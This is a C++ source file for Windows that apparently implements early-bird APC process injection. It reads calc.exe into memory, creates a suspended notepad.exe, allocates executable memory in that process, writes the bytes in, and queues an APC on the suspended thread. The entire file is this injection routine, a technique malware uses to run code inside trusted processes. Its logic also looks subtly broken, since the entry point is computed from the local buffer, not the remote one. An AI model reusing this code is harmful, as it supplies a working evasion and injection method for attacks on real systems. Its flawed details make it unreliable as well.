#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <Dbghelp.h>
#include <psapi.h>
#include <tchar.h>

HANDLE ps;
PROCESSENTRY32 psinfo;
MODULEINFO mi;
MODULEENTRY32 modentry;

DWORD get_ep(LPVOID buffer_addr)
{
	PIMAGE_DOS_HEADER dosHeader = {};
	PIMAGE_NT_HEADERS imageNTHeaders = {};
	dosHeader = (PIMAGE_DOS_HEADER)buffer_addr;
	printf("0x%xMagic bytes\n", dosHeader->e_magic);
	imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)buffer_addr + dosHeader->e_lfanew);
	printf("0x%xAddressOfEntryPoint\n", imageNTHeaders->OptionalHeader.AddressOfEntryPoint);
	return (DWORD)buffer_addr + imageNTHeaders->OptionalHeader.AddressOfEntryPoint;
}

void get_base_addr(HANDLE hProcess)
{
	HMODULE hMods[1024];
	DWORD cbNeeded;

	EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded);
	for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
	{
		TCHAR szModName[MAX_PATH];
		if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
			sizeof(szModName) / sizeof(TCHAR)))
		{
			// Print the module name and handle value.
			_tprintf(TEXT("\t%s (0x%08X)\n"), szModName, hMods[i]);
		}
	}
	/*
	ps = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	psinfo.dwSize = sizeof(PROCESSENTRY32);
	modentry.dwSize = sizeof(MODULEENTRY32);

	if (!Process32First(ps, &psinfo))
	{
		DWORD err = GetLastError();
		printf("Process32First Error: %d", GetLastError());
	}
	else
	{
		while (Process32Next(ps, &psinfo))
		{
			DWORD pid = psinfo.th32ProcessID;
			if (pid == pi_pid)
			{
				if (!Module32First(ps, &modentry))
				{
					printf("Module32First Error: %d", GetLastError());
				}
				else
				{
					printf("PID: %d\n", pi_pid);
					printf("Module_Name: %ls\n", modentry.szModule);

					while (Module32Next(ps, &modentry))
					{
						WCHAR * modname = modentry.szModule;
						int cmp = wcscmp(modname, L"notepad.exe");
						if (cmp == 0)
						{
							DWORD base_addr = (DWORD)modentry.modBaseAddr;
							return base_addr;
						}
						else
						{
							continue;
						}
					}

				}
			}
			else
			{
				continue;
			}
		}
		
	}*/
}

int main()
{
			STARTUPINFOA si;
			PROCESS_INFORMATION pi;
			ZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);
			ZeroMemory(&pi, sizeof(pi));
			VOID CALLBACK APCProc();

			HANDLE hFile = CreateFileA("C:\\Windows\\System32\\calc.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hFile == INVALID_HANDLE_VALUE)
			{
				printf("CreateFileA Error: %d", GetLastError());
			}

			{
				DWORD fSize = GetFileSize(hFile, NULL);
				if (fSize == INVALID_FILE_SIZE)
				{
					printf("GetFileSize Error: %d", GetLastError());
				}
				else
				{
					LPVOID buffer_addr = VirtualAlloc(NULL, fSize, MEM_COMMIT, PAGE_READWRITE);
					if (buffer_addr == NULL)
					{
						printf("VirtualAlloc Error: %d", GetLastError());
					}
					else
					{
						if (!ReadFile(hFile, buffer_addr, fSize, 0, NULL))
						{
							printf("ReadFile Error: %d", GetLastError());
						}
						else
						{
							if (!CloseHandle(hFile))
							{
								printf("CloseHandle Error: %d", GetLastError());
							}
							else
							{
								if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
								{
									printf("CreateProcess Error: %d", GetLastError());
								}
								else
								{
									//GetModuleInformation(pi.hProcess, pi.hProcess, mi, sizeof(mi));
									//get_base_addr(pi.hProcess);
									LPVOID remote_addr = VirtualAllocEx(pi.hProcess, NULL, fSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
									if (remote_addr == NULL)
									{
										printf("VirtualAllocEx Error: %d", GetLastError());
									}
									else
									{
										if (!WriteProcessMemory(pi.hProcess, remote_addr, buffer_addr, fSize, NULL))
										{
											printf("WriteProcessMemory Error: %d", GetLastError());
										}
										else
										{
											DWORD ep = get_ep(buffer_addr);
											PTHREAD_START_ROUTINE pfnAPC = (PTHREAD_START_ROUTINE)ep;
											if (!QueueUserAPC((PAPCFUNC)pfnAPC, pi.hThread, NULL))
											{
												DWORD err = GetLastError();
												printf("QueueUserAPC Error: %d", GetLastError());
											}
											else
											{
												ResumeThread(pi.hThread);
												printf("[+] NO ERRORS!");
											}
										}
									}
								}
							}
						}
					}
				}

			}
}
